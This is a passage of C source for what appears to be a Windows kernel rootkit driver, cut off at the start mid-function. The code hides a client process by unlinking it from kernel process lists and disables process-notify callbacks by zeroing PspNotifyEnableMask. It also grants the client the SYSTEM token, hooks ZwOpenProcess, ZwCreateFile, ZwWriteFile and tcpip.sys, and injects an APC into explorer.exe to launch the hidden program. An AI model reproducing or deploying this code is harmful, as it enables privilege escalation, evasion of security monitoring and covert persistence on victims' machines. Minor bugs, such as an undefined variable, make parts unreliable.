			// RtlZeroMemory(process->SeAuditProcessCreationInfo.ImageFileName->Name.Buffer, process->SeAuditProcessCreationInfo.ImageFileName->Name.Length);

			// hide process' entry from those lists
			hideListEntry(&process->MmProcessLinks);
			hideListEntry(&process->ActiveProcessLinks);
			hideListEntry(&process->SessionProcessLinks);

			break;
		}
	}
}

void printMmLoadedUserImageList()
{
	DbgPrint("MmLoadedUserImageList = %X\n", getMmLoadedUserImageList());
	
	// InMemoryOrderLinks looks like so:
	// +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x40107 - 0x1 ]
	// And InInitializationOrderLinks like:
	// +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x82b8fcf8 - 0x82b8fcf8 ]
	// InLoadOrderLinks:
	// +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x8fbf5428 - 0x85d15188 ]
	//
	// for subsequent elements InLoadOrderLinks (i.e. InLoadOrderLinks->Flink),
	// InInitializationOrderLinks and InMemoryOrderLinks are all 0s
	LIST_ENTRY* head = &getMmLoadedUserImageList()->InLoadOrderLinks;

	LIST_ENTRY* entry = head->Flink;
	
	while(entry->Flink != head)
	{
		entry = entry->Flink;

		LDR_DATA_TABLE_ENTRY* ldr = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		DbgPrint("\tMmUserLoadedModule: %wZ\n", &ldr->BaseDllName);
	}
}

// PsActiveProcessHead == PsInitialProcess->ActiveProcessLinks->Blink
void printPsActiveProcess()
{
	DbgPrint("PsActiveProcessHead = %X\n", getPsActiveProcessHead());

	LIST_ENTRY* head = getPsActiveProcessHead();

	LIST_ENTRY* entry = head->Flink;

	while(entry->Flink != head)
	{
		entry = entry->Flink;

		EPROCESS* process = CONTAINING_RECORD(entry, EPROCESS, ActiveProcessLinks);

		UNICODE_STRING str;
		getProcessImageFileName(process, &str);

		DbgPrint("\tPsActiveProcess: %wZ | PID: %d | process: %X\n", &str, process->UniqueProcessId, process);
	}
}

NTSTATUS BuildQueryDirectoryIrp(HANDLE directoryHandle, BOOLEAN shouldRestartScan, FILE_DIRECTORY_INFORMATION* fileInfo, ULONG fileInfoLength, IO_STATUS_BLOCK* iosb, FILE_OBJECT** outDirObj, DEVICE_OBJECT** outDevObj, IRP** outIrp)
{
	FILE_OBJECT* directoryObject = getHandleObjectBelongingToProcess(PsGetCurrentProcess(), directoryHandle);
	
	if(!directoryObject)
		return STATUS_INVALID_HANDLE;

	DbgPrint("Was directory object busy? %d | shouldn't be\n", directoryObject->Busy);
	directoryObject->Busy = TRUE;
	directoryObject->Event.Header.SignalState = 0;

	DEVICE_OBJECT* deviceObject = IoGetRelatedDeviceObject(directoryObject);

	if(!deviceObject)
		return STATUS_INVALID_DEVICE_OBJECT_PARAMETER;

	IRP* irp = IoAllocateIrp(deviceObject->StackSize, TRUE);

	if(!irp)
		return STATUS_UNSUCCESSFUL;

	irp->UserIosb = iosb;
	irp->UserEvent = NULL;
	irp->MdlAddress = NULL;
	irp->UserBuffer = fileInfo;
	irp->RequestorMode = KernelMode;
	irp->Flags = IRP_DEFER_IO_COMPLETION;
	irp->AssociatedIrp.SystemBuffer = NULL;
	irp->Tail.Overlay.AuxiliaryBuffer = NULL;
	irp->Tail.Overlay.Thread = PsGetCurrentThread();
	irp->Tail.Overlay.OriginalFileObject = directoryObject;
	irp->Overlay.AsynchronousParameters.UserApcRoutine = NULL;
	irp->Overlay.AsynchronousParameters.UserApcContext = NULL;

	IO_STACK_LOCATION* nextIoStackLocation = IoGetNextIrpStackLocation(irp);

	if(!nextIoStackLocation)
		return STATUS_UNSUCCESSFUL;
	
	nextIoStackLocation->Flags = shouldRestartScan ? 1 : 0;

	nextIoStackLocation->Flags |= 2;

	nextIoStackLocation->MajorFunction = 0xC;
	nextIoStackLocation->MinorFunction = 0x1;

	nextIoStackLocation->FileObject = directoryObject;

	nextIoStackLocation->Parameters.QueryDirectory.FileName = NULL;
	nextIoStackLocation->Parameters.QueryDirectory.FileIndex = NULL;
	nextIoStackLocation->Parameters.QueryDirectory.Length = fileInfoLength;
	nextIoStackLocation->Parameters.QueryDirectory.FileInformationClass = FileDirectoryInformation;

	*outIrp = irp;
	*outDevObj = deviceObject;
	*outDirObj = directoryObject;

	return STATUS_SUCCESS;
}

NTSTATUS IoSynchronousServiceTail(IRP* irp, DEVICE_OBJECT* directoryRelatedDeviceObject, FILE_OBJECT* directoryObject)
{
	irp->AllocationFlags = IRP_PAGING_IO;

	IoQueueThreadIrp(irp);

	ULONG flags = ((ETHREAD*)PsGetCurrentThread())->CrossThreadFlags;

	// whatever was at the 10th bit is now at the 0 bit
	flags >>= 10;

	// in other words:				  flags &= 1 | 2 | 3;
	// or: flags &= (1 << 0) | (1 << 1) | (1 << 2);
	// because we want flags to be equals to ThreadIoPriority (which takes 3 bits) only
	flags &= 7;

	if(flags < IoPriorityNormal)
	{
		ULONG newFlags = ((ETHREAD*)PsGetCurrentThread())->CrossThreadFlags;

		// if it has ThreadIoPriority lower than IoPriorityNormal (== 2) then it's either 1 or 0
		// so clear the first bit (if it's not set then it's unneeded)
		// after it ThreadIoPriority == 0 for sure
		newFlags &= ~(1 << 10);

		// set the second bit of the ThreadIoPriority field, which will make ThreadIoPriority == 2,
		// so ThreadIoPriority == IoPriorityNormal
		newFlags |= 1 << 11;

		((ETHREAD*)PsGetCurrentThread())->CrossThreadFlags = newFlags;
	}

	// 0xFFF1FFFF => all bits set except bits: 17, 18 i 19
	// so it looks like: 11111111 11110001 11111111 11111111
	//
	// so it sets irp->Flags to whatever there is except for the 3 bits
	// (17th, 18th, 19th - IoPriority is there most likely), that are set
	// to ThreadIoPriority + 1
	// edit: from IoGetIoPriorityHint(PIRP irp) it can be seen that those 3 bits mean IoPriorityHint
	flags++;
	flags <<= 17;
	flags |= irp->Flags & 0xFFF1FFFF;
	irp->Flags = flags;

	IO_PRIORITY_HINT hint = IoGetIoPriorityHint(irp);

	DbgPrint("Priority hint = %d | %s\n", IoGetIoPriorityHint(irp), IoGetIoPriorityHint(irp) < IoPriorityNormal ? "WRONG" : "OK");
	
	DbgPrint("IRP              = %X\n", irp);
	DbgPrint("Device object    = %X\n", directoryRelatedDeviceObject);
	DbgPrint("Directory object = %X\n", directoryObject);

	NTSTATUS status = IoCallDriver(directoryRelatedDeviceObject, irp);

	if(status != STATUS_SUCCESS)
	{
		DbgPrint("IoCallDriver failed with code %X\n", status);

		return status;
	}

	DbgPrint("IoCallDriver succeeded\n");

	/*
		KIRQL oldIrql;
		KeRaiseIrql(APC_LEVEL, &oldIrql);

		IoCompleteRequest(irp, IO_NO_INCREMENT);

		KeLowerIrql(oldIrql);
	*/

	directoryObject->Busy = FALSE;

	// handle directoryObject->Waiters?
	DbgPrint("There are %d waiters\n", directoryObject->Waiters);

	return STATUS_SUCCESS;
}

NTSTATUS QueryDirectory(HANDLE handle, BOOLEAN shouldRestartScan, IO_STATUS_BLOCK* iosb, FILE_DIRECTORY_INFORMATION* fileInfo, ULONG fileInfoLength)
{
	IRP* irp;
	DEVICE_OBJECT* deviceObject;
	FILE_OBJECT* directoryObject;
	
	NTSTATUS status = BuildQueryDirectoryIrp(handle, shouldRestartScan, fileInfo, fileInfoLength, iosb, &directoryObject, &deviceObject, &irp);

	if(status != STATUS_SUCCESS)
	{
		DbgPrint("BuildQueryDirectoryIrp failed with code %X\n", status);

		return status;
	}

	return IoSynchronousServiceTail(irp, deviceObject, directoryObject);
}

void listFilesInClientProgramDirectory()
{
	HANDLE directoryHandle;
	
	OBJECT_ATTRIBUTES oa;
	UNICODE_STRING name;
	RtlInitUnicodeString(&name, L"\\??\\" CLIENT_PROGRAM_DIRECTORY_PATH); // L"\\Device\\HarddiskVolume1\\"
	InitializeObjectAttributes(&oa, &name, NULL, NULL, NULL);

	IO_STATUS_BLOCK ioStatusBlock;

	// take the lowest required access and highest shared access so opening surely works -
	// we aren't using the object so it doesn't matter here much,
	// and we can do e.g. FILE_OBJECT->WriteAccess = TRUE; anyway
	// FILE_SYNCHRONOUS_IO_NONALERT because otherwise STATUS_PENDING is returned, since it assumes asynchronous operation
	NTSTATUS status = ZwCreateFile(&directoryHandle, FILE_LIST_DIRECTORY, &oa, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 
										FILE_SHARE_VALID_FLAGS, FILE_OPEN, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

	if(!NT_SUCCESS(status))
	{
		DbgPrint("ZwCreateFile of \"%wZ\" failed with code %X\n", &name, st);

		return;
	}
	
	// DbgPrint("ZwCreateFile of \"%wZ\" succeeded, handle = %X, file object = %X\n", &name, directoryHandle, getHandleObjectBelongingToProcess(PsGetCurrentProcess(), directoryHandle));
	
	BYTE buf[1000];
	IO_STATUS_BLOCK ioblock;

	status = QueryDirectory(directoryHandle, TRUE, &ioStatusBlock, buf, sizeof buf); // ZwQueryDirectoryFile(directoryHandle, NULL, NULL, NULL, &ioblock, buf, sizeof buf, FileDirectoryInformation, TRUE, NULL, TRUE);
	
	if(status != STATUS_SUCCESS)
	{
		DbgPrint("QueryDirectory of \"%wZ\" failed with code %X\n", &name, status);

		return;
	}

	FILE_DIRECTORY_INFORMATION* fileDirectoryInfo = buf;

	// Length / sizeof(WCHAR) because Length alone returns e.g.:
	// "Documents and Settings????????z???????????", so Length is length in bytes
	DbgPrint("First file name: \"");

	for(int i = 0; i < fileDirectoryInfo->FileNameLength / sizeof(WCHAR); i++)
		DbgPrint("%wc", fileDirectoryInfo->FileName[i]);

	DbgPrint("\"\n");

	while(1)
	{
		status = QueryDirectory(directoryHandle, FALSE, &ioStatusBlock, buf, sizeof buf); // ZwQueryDirectoryFile(directoryHandle, NULL, NULL, NULL, &ioStatusBlock, buf, sizeof buf, FileDirectoryInformation, TRUE, NULL, FALSE);

		if(!NT_SUCCESS(status))
		{
			if(status == STATUS_NO_MORE_FILES)
				DbgPrint("QueryDirectory of \"%wZ\" finished - there are no more files\n", &name);
			else
				DbgPrint("QueryDirectory of \"%wZ\" finished with code %X\n", &name, status);
			
			break;
		}

		DbgPrint("Next file name: \"");

		for(int i = 0; i < fileDirectoryInfo->FileNameLength / sizeof(WCHAR); i++)
			DbgPrint("%wc", fileDirectoryInfo->FileName[i]);

		DbgPrint("\"\n");
	}
}

NTSTATUS DriverEntry(DRIVER_OBJECT* driverObject, UNICODE_STRING* registryPath)
{
	DbgPrint("DriverEntry | Registry path: %wZ\n", registryPath);
	
	driverObject->DriverUnload = onDriverUnload;
	
	LDR_DATA_TABLE_ENTRY* PsLoadedModuleList = getPsLoadedModuleList();
	
	LDR_DATA_TABLE_ENTRY* currentModuleList = PsLoadedModuleList;
	
	while(1)
	{
		void* imageBase = currentModuleList->DllBase;
		
		// MmVerifyCallbackFunction performs this neat check
		if(preop >= imageBase && preop < (BYTE*)imageBase + currentModuleList->SizeOfImage)
		{
			DbgPrint("Found image. Verify enabled = %d\n", currentModuleList->Flags & FLAG_IS_VERIFIED_IMAGE);

			currentModuleList->Flags |= FLAG_IS_VERIFIED_IMAGE;

			break;
		}

		currentModuleList = CONTAINING_RECORD(currentModuleList->InLoadOrderLinks.Flink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if(currentModuleList == PsLoadedModuleList)
		{
			DbgPrint("IMAGE NOT FOUND!\n");

			break;
		}
	}
	
	sleep(5);

	dispatchUserModeAPCRoutine();

	//=========
	registerCallbacks();

	ULONG* mask = getPspNotifyEnableMask();

	DbgPrint("PspNotifyEnableMask = %X, setting to 0, ", *mask);

	*mask = 0;

	DbgPrint("now = %X\n", *mask);
	//=========
	
	// wait for client process to be created

	__asm
	{
		push eax

		loop:
			mov eax, clientPID
			test eax, eax
			jz loop

		pop eax
	}
	
	DbgPrint("ClientPID = %d. Hiding client process\n", clientPID);
	
	//==========

	setupClientProcess();

	DbgPrint("Sleeping for 5 seconds\n");

	sleep(5);

	//==========

	DbgPrint("Client process token = %X\n", getProcessToken(clientProcess));
	DbgPrint("System process token = %X\n", getProcessToken(PsInitialSystemProcess));

	/*
		TOKEN* systemToken = getProcessToken(PsInitialSystemProcess);
		TOKEN* clientToken = getProcessToken(clientProcess);
		clientToken->TokenSource.SourceIdentifier = systemToken->TokenSource.SourceIdentifier;
		RtlCopyMemory(clientToken->TokenSource.SourceName, systemToken->TokenSource.SourceName, sizeof(systemToken->TokenSource.SourceName));
		clientToken->TokenId = systemToken->TokenId;
		clientToken->AuthenticationId = systemToken->AuthenticationId;
		clientToken->ModifiedId = systemToken->ModifiedId;
		clientToken->Privileges = systemToken->Privileges;
		clientToken->TokenFlags = systemToken->TokenFlags;
		clientToken->MandatoryPolicy = systemToken->MandatoryPolicy;
		clientToken->IntegrityLevelIndex = systemToken->IntegrityLevelIndex;
		clientToken->LogonSession = systemToken->LogonSession;
		clientToken->LogonSession = systemToken->LogonSession;
		clientToken->pDeviceMap = NULL;
	*/

	//===========

	DbgPrint("Copying SYSTEM process token to client process token\n");

	clientProcess->Token = ((EPROCESS*)PsInitialSystemProcess)->Token;
	
	//==========

	DbgPrint("Hooking ZwOpenProcess, ZwCreateFile, ZwWriteFile\n");

	hookNtFunction(ZwOpenProcess, ntOpenProcessHook);
	hookNtFunction(ZwCreateFile, ntCreateFileHook);
	hookNtFunction(ZwWriteFile, ntWriteFileHook);

	DbgPrint("Hooking tcpip.sys\n");

	hookTcpIpDriver();

	// not needed, because at this point the process' LIST_ENTRY is already hidden
	// hookNtFunction(ZwQuerySystemInformation, ntQuerySystemInformationHook);

	DbgPrint("Process list after hooking:\n");
	
	printMmLoadedUserImageList();
	printPsActiveProcess();

	//==========

	DbgPrint("Files in client program directory:\n");

	listFilesInClientProgramDirectory();

	return STATUS_SUCCESS;
}

void* getExportedRoutine(EPROCESS* process, const char* exportingDllName, const char* exportedRoutineName)
{
	LIST_ENTRY* head = &process->Peb->Ldr->InLoadOrderModuleList;
	LIST_ENTRY* entry = head;

	ANSI_STRING ansiExportingDllName;
	RtlInitAnsiString(&ansiExportingDllName, exportingDllName);

	UNICODE_STRING unicodeExportingDllName;

	if(!NT_SUCCESS(RtlAnsiStringToUnicodeString(&unicodeExportingDllName, &ansiExportingDllName, TRUE)))
		DbgPrint("RtlAnsiStringToUnicodeString failed\n");

	while(entry->Flink != head)
	{
		entry = entry->Flink;
		
		LDR_DATA_TABLE_ENTRY* ldrDataTableEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		
		// FALSE - case-sensitive - so e.g. NTDLL != ntdll
		if(!RtlEqualUnicodeString(&unicodeExportingDllName, &ldrDataTableEntry->BaseDllName, TRUE))
			continue;
		
		IMAGE_DOS_HEADER* imageDosHeader = (IMAGE_DOS_HEADER*)ldrDataTableEntry->DllBase;

		if(imageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		{
			DbgPrint("NO IMAGE_DOS_SIGNATURE\n");

			continue;
		}

		IMAGE_NT_HEADERS32* imageNtHeaders = (IMAGE_NT_HEADERS32*)((DWORD)imageDosHeader + imageDosHeader->e_lfanew);

		if(imageNtHeaders->Signature != IMAGE_NT_SIGNATURE)
		{
			DbgPrint("NO IMAGE_NT_SIGNATURE\n");

			continue;
		}

		IMAGE_EXPORT_DIRECTORY* imageExportDirectory = (IMAGE_EXPORT_DIRECTORY*)((DWORD)imageDosHeader + imageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
			
		DWORD* exportedFunctionsRvaNames = (DWORD)imageDosHeader + imageExportDirectory->AddressOfNames;
		DWORD* exportedFunctionsRvaAddresses = (DWORD)imageDosHeader + imageExportDirectory->AddressOfFunctions;
		WORD* exportedFunctionNamesOrdinals = (DWORD)imageDosHeader + imageExportDirectory->AddressOfNameOrdinals;

		DbgPrint(
					"Found correct DLL - %s."
					"Base = %d\n"
					"Number of functions = %d\n"
					"Number of names = %d\n", exportingDllName, imageExportDirectory->Base, imageExportDirectory->NumberOfFunctions, imageExportDirectory->NumberOfNames);
		
		for(DWORD i = 0; i < imageExportDirectory->NumberOfNames; i++)
		{
			// Ordinal is a function's index in the address array
			// The functions shown in the names array are in alphabetical order so their order
			// in the address array may differ. In reality there's no connection between the two.
			// E.g.:
			/*
				In names array:
				[0] = CancelIo =>			   ordinal 1
				[1] = CancelIoEx =>			   ordinal 4
				[2] = CancelSynchronousIo =>   ordinal 2
				[3] = CancelTimerQueueTimer => ordinal 7

				And in address array (ordinal is the index in this array - it doesn't have to match the names array index):

				[0] = <unknown1>				 => ordinal 0
				[1] = CancelIo					 => ordinal 1
				[2] = CancelSynchronousIo		 => ordinal 2
				[3] = <unknown2>				 => ordinal 3
				[4] = CancelIoEx				 => ordinal 4
				[5] = <unknown3>				 => ordinal 5
				[6] = <unknown4>				 => ordinal 6
				[7] = CancelTimerQueueTimer		 => ordinal 7
			*/
			// But there's a connection between ordinals table and names table:
			/*
				Names table:
				[0] = CancelIo
				[1] = CancelIoEx
				[2] = CancelSynchronousIo
				[3] = CancelTimerQueueTimer

				Ordinals table:
				[0] = ordinal of(CancelIo)
				[1] = ordinal of(CancelIoEx)
				[2] = ordinal of(CancelSynchronousIo)
				[3] = ordinal of(CancelTimerQueueTimer)
			*/

			char* functionName = (DWORD)imageDosHeader + exportedFunctionsRvaNames[i];

			if(!functionName)
				DbgPrint("\t- Function name is null\n");

			WORD ordinal = exportedFunctionNamesOrdinals[i];

			// DbgPrint("\t- Function %s (ordinal: %d | index: %d, loaded at %X)\n", functionName, ordinal, i, (DWORD)imageDosHeader + exportedFunctionsRvaAddresses[ordinal]);

			if(strcmp(functionName, exportedRoutineName) != 0)
				continue;

			DbgPrint("Function %s has been found and is available at address %X\n", exportedRoutineName, (DWORD)imageDosHeader + exportedFunctionsRvaAddresses[ordinal]);

			return (DWORD)imageDosHeader + exportedFunctionsRvaAddresses[ordinal];
		}
	}

	return NULL;
}

// name of the process that we'll attach to and call CreateProcessW from
#define PARENT_PROCESS_NAME L"explorer.exe"

void getParentProcessThread(EPROCESS** processOut, ETHREAD** threadOut)
{
	// assuming that the System process is the first, then HEAD is before it
	LIST_ENTRY* processHead = getPsActiveProcessHead();

	LIST_ENTRY* processEntry = processHead->Flink;

	UNICODE_STRING parentProcessName;
	RtlInitUnicodeString(&parentProcessName, PARENT_PROCESS_NAME);

	while(1)
	{
		EPROCESS* process = CONTAINING_RECORD(processEntry, EPROCESS, ActiveProcessLinks);

		UNICODE_STRING name;
		getProcessImageFileName(process, &name);
		
		DbgPrint("Name: %wZ\n", &name);

		if(!RtlEqualUnicodeString(&name, &parentProcessName, FALSE))
		{
			processEntry = processEntry->Flink;

			if(processEntry == processHead)
			{
				DbgPrint("That was the last process\n");

				break;
			}

			continue;
		}

		LIST_ENTRY* threadHead = &process->ThreadListHead;

		DbgPrint("Process ID = %X, thread count = %d\n", process->UniqueProcessId, process->ActiveThreads);

		LIST_ENTRY* threadEntry = threadHead->Flink;

		while(1)
		{
			ETHREAD* thread = CONTAINING_RECORD(threadEntry, ETHREAD, ThreadListEntry);

			CLIENT_ID* clientId = (CLIENT_ID*)((BYTE*)thread + 0x22C);

			DbgPrint("\tProcess ID = %X, Thread ID = %X, ETHREAD = 0x%X\n", clientId->UniqueProcess, clientId->UniqueThread, thread);

			if(thread->MiscFlags & THREAD_ALERTABLE_FLAG)
			{
				DbgPrint("\t\t--> Alertable thread found in process %X. Flag is [%s]\n", process, (*(DWORD*)((BYTE*)thread + 0xB8) & 32) ? "OK" : "WRONG");

				*processOut = process;
				*threadOut = thread;

				return;
			}

			threadEntry = threadEntry->Flink;

			if(threadEntry == threadHead)
				break;
		}

		processEntry = processEntry->Flink;

		if(processEntry == processHead)
		{
			DbgPrint("That was the last process\n");

			break;
		}
	}
}

void* allocateUserModePage()
{
	void* buffer = NULL;
	ULONG size = PAGE_SIZE;

	NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &buffer, NULL, &size, MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if(!NT_SUCCESS(status))
	{
		DbgPrint("ZwAllocateVirtualMemory error %X\n", status);

		return NULL;
	}

	status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &buffer, NULL, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if(!NT_SUCCESS(status))
	{
		DbgPrint("ZwAllocateVirtualMemory error %X\n", status);

		return NULL;
	}

	DbgPrint("ZwAllocateVirtualMemory success. Address = %X, size = %d\n", buffer, size);

	RtlZeroMemory(buffer, size);

	return buffer;
}

typedef struct _STARTUPINFOW
{
	DWORD  cb;
	LPWSTR lpReserved;
	LPWSTR lpDesktop;
	LPWSTR lpTitle;
	DWORD  dwX;
	DWORD  dwY;
	DWORD  dwXSize;
	DWORD  dwYSize;
	DWORD  dwXCountChars;
	DWORD  dwYCountChars;
	DWORD  dwFillAttribute;
	DWORD  dwFlags;
	WORD   wShowWindow;
	WORD   cbReserved2;
	BYTE* lpReserved2;
	HANDLE hStdInput;
	HANDLE hStdOutput;
	HANDLE hStdError;
} STARTUPINFOW, *LPSTARTUPINFOW;

typedef struct _PROCESS_INFORMATION
{
	HANDLE hProcess;
	HANDLE hThread;
	DWORD  dwProcessId;
	DWORD  dwThreadId;
} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;

void userModeAPCRoutine(void*, void*, void*);
void kernelModeAPCRoutine(void**, void**, void**, void**, void**);

typedef struct
{
	void* CreateProcessW;
	WCHAR* exePath;
	STARTUPINFOW* procStartupInfoW;
	LPPROCESS_INFORMATION processInfo;
	HANDLE* clientPID;
}APC_PARAM;

void queueAPC(APC_PARAM* apcParam, void* userModeAPCRoutine, void* thread)
{
	typedef enum
	{
		OriginalApcEnvironment,
		AttachApcEnvironment,
		CurrentApcEnvironment,
		InsertApcEnvironment
	} KAPC_ENVIRONMENT;

	NTKERNELAPI BOOLEAN KeInsertQueueApc(PKAPC Apc, PVOID SystemArgument1, PVOID SystemArgument2, UCHAR mode);

	// RundownRoutine is called when the system is about to remove the APC from queue e.g. when the thread is being terminated
	// and then (I think) neither kernel nor normal routine is called
	NTKERNELAPI void KeInitializeApc(IN PKAPC Apc, IN PKTHREAD Thread, IN KAPC_ENVIRONMENT Environment, IN /*PKKERNEL_ROUTINE*/ void* KernelRoutine, IN /*PKRUNDOWN_ROUTINE*/ void* RundownRoutine OPTIONAL, IN /*PKNORMAL_ROUTINE*/ void* NormalRoutine OPTIONAL, IN KPROCESSOR_MODE ApcMode, IN PVOID NormalContext);

	KAPC_STATE apcState;
	
	KAPC* apc = ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), 'kapc');

	RtlZeroMemory(apc, sizeof *apc);

	KeInitializeApc(apc, thread, OriginalApcEnvironment, NULL, NULL, userModeAPCRoutine, UserMode, apcParam);

	if(!KeInsertQueueApc(apc, 0, 0, 0))
		DbgPrint("KeInsertQueueApc failed\n");
	else
		DbgPrint("KeInsertQueueApc succeeded\n");
}

void dispatchUserModeAPCRoutine()
{
	ETHREAD* thread = NULL;
	EPROCESS* process = NULL;

	getParentProcessThread(&process, &thread);

	DbgPrint("Attaching to process %X -> thread %X\n", process, thread);

	__try
	{
		KAPC_STATE apcState;
		
		KeStackAttachProcess(process, &apcState);

		MDL* mdl = IoAllocateMdl(&clientPID, sizeof(clientPID), FALSE, FALSE, NULL);

		MmProbeAndLockPages(mdl, KernelMode, IoWriteAccess);

		HANDLE* clientPidPtr = MmMapLockedPagesSpecifyCache(mdl, UserMode, MmNonCached, NULL, FALSE, NormalPagePriority);
		
		const WCHAR* path = CLIENT_PROGRAM_PATH;
		WCHAR* pathPtr = allocateUserModePage();
		RtlCopyMemory(pathPtr, path, wcslen(path) * sizeof *path);

		LPSTARTUPINFOW startupInfoPtr = allocateUserModePage();
		startupInfoPtr->cb = sizeof *startupInfoPtr;

		LPPROCESS_INFORMATION procInfoPtr = allocateUserModePage();

		APC_PARAM* apcParamPtr = allocateUserModePage();
		apcParamPtr->CreateProcessW = getExportedRoutine(process, "kernel32.dll", "CreateProcessW");
		apcParamPtr->exePath = pathPtr;
		apcParamPtr->procStartupInfoW = startupInfoPtr;
		apcParamPtr->processInfo = procInfoPtr;
		apcParamPtr->clientPID = clientPidPtr;

		//- allocate X bytes (X >= size of the routine)
		//- copy the user mode routine into the newly allocated memory
		void* apcRoutinePtr = allocateUserModePage();

		RtlCopyMemory(apcRoutinePtr, userModeAPCRoutine, PAGE_SIZE); // 73

		KeUnstackDetachProcess(&apcState);

		queueAPC(apcParamPtr, apcRoutinePtr, thread);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		DbgPrint("APC parameters creation exception %X\n", GetExceptionCode());
	}
}

void userModeAPCRoutine(APC_PARAM* normalContext, void* p2, void* p3)
{
	typedef BOOLEAN(__stdcall* CreateProcessWType)(
		LPCWSTR               lpApplicationName,
		LPWSTR                lpCommandLine,
		void*						 lpProcessAttributes,
		void*                 lpThreadAttributes,
		BOOLEAN               bInheritHandles,
		DWORD                 dwCreationFlags,
		void*                 lpEnvironment,
		LPCWSTR               lpCurrentDirectory,
		LPSTARTUPINFOW        lpStartupInfo,       // Handles in STARTUPINFO or STARTUPINFOEX must be closed with CloseHandle when they are no longer needed.
		LPPROCESS_INFORMATION lpProcessInformation // Handles in PROCESS_INFORMATION must be closed with CloseHandle when they are no longer needed.
		);

	CreateProcessWType CreateProcessW = normalContext->CreateProcessW;

	CreateProcessW(normalContext->exePath, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, normalContext->procStartupInfoW, normalContext->processInfo);
	*normalContext->clientPID = normalContext->processInfo->dwProcessId;
}
